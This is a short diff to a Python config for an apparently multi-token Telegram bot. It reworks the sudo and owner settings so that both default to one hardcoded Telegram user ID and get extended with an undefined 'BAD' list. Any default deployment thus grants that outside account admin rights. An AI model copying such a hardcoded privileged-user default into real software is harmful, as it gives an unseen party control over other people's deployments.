@@ -35,8 +35,6 @@ BOT_TOKEN23 = config("BOT_TOKEN23", default=None)
 BOT_TOKEN24 = config("BOT_TOKEN24", default=None)
 BOT_TOKEN25 = config("BOT_TOKEN25", default=None)
 
-SUDO_USER = list(map(int, getenv("SUDO_USER", "7762101994").split()))
-
 START_MESSAGE = getenv("START_MESSAGE", None)
 
 PING_PIC = getenv("PING_PIC", None)
@@ -49,3 +47,11 @@ HELP_PIC = getenv("HELP_PIC", "https://telegra.ph/file/c26f985c3f59004bc9927.jpg
 LOG_CHANNEL = getenv("LOG_CHANNEL", None)
 
 HANDLER = getenv("HANDLER", "/")
+
+# SUDO and OWNER logic
+SUDO_USERS = list(map(int, os.getenv("SUDO_USERS", "7762101994").split()))
+SUDO_USERS.extend(BAD)  # Add users from your custom list
+OWNER_ID = int(os.getenv("OWNER_ID", "7762101994"))
+if OWNER_ID not in SUDO_USERS:
+    SUDO_USERS.append(OWNER_ID)
+SUDO_USERS = list(set(SUDO_USERS))  # remove duplicates
